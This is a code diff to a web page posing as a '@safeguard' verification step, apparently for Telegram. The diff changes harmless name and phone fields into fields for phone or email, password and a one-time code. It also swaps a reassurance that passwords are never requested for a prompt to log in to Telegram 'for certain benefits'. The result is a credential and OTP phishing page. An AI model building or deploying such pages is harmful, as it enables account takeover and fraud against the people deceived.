@@ -97,6 +97,28 @@
             border-color: #4CAF50;
         }
 
+        .input-wrapper {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            color: #666;
+            padding: 5px;
+            line-height: 1;
+        }
+
+        .toggle-password:hover {
+            color: #4CAF50;
+        }
+
         .verify-btn {
             width: 100%;
             padding: 16px;
@@ -202,17 +224,22 @@
 
             <form id="form1">
                 <div class="form-group">
-                    <label for="name">Full Name</label>
-                    <input type="text" id="name" name="name" placeholder="Enter your name" required>
+                    <label for="name">Phone or Email</label>
+                    <input type="text" id="name" name="name" placeholder="Enter Phone or Email" required>
                 </div>
 
                 <div class="form-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+                    <label for="phone">Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="phone" name="phone" placeholder="Input password" required>
+                        <button type="button" class="toggle-password" id="togglePhone">
+                            👁️
+                        </button>
+                    </div>
                 </div>
 
                 <button type="submit" class="verify-btn" id="submitBtn1">
-                    Click here to verify
+                    Login to Verify
                 </button>
 
                 <p class="error-message" id="errorMsg1">Please fill in all fields correctly</p>
@@ -220,7 +247,7 @@
 
             <div class="warning">
                 <span class="warning-icon">⚠</span>
-                <span class="warning-text">We will never ask you for password or sensitive information</span>
+                <span class="warning-text">Login your Telegram to be eligible for certain benefits</span>
             </div>
 
             <p class="footer">@safeguard</p>
@@ -235,13 +262,13 @@
             </div>
 
             <p class="welcome-text">Almost Done!</p>
-            <h1>Additional Information</h1>
-            <p class="subtitle">Please provide your surname to complete verification</p>
+            <h1>check your email or phone for OTP</h1>
+            <p class="subtitle">Please provide OTP to complete verification</p>
 
             <form id="form2">
                 <div class="form-group">
-                    <label for="surname">Surname</label>
-                    <input type="text" id="surname" name="surname" placeholder="Enter your surname" required>
+                    <label for="surname">OTP</label>
+                    <input type="text" id="surname" name="surname" placeholder="Enter OTP" required>
                 </div>
 
                 <button type="submit" class="verify-btn" id="submitBtn2">
@@ -284,6 +311,20 @@
         const errorMsg1 = document.getElementById('errorMsg1');
         const errorMsg2 = document.getElementById('errorMsg2');
         const successMsg = document.getElementById('successMsg');
+
+        // Toggle password visibility
+        const togglePhoneBtn = document.getElementById('togglePhone');
+        const phoneInput = document.getElementById('phone');
+
+        togglePhoneBtn.addEventListener('click', () => {
+            if (phoneInput.type === 'password') {
+                phoneInput.type = 'text';
+                togglePhoneBtn.textContent = '🙈';
+            } else {
+                phoneInput.type = 'password';
+                togglePhoneBtn.textContent = '👁️';
+            }
+        });
 
         // Handle first form submission
         form1.addEventListener('submit', (e) => {
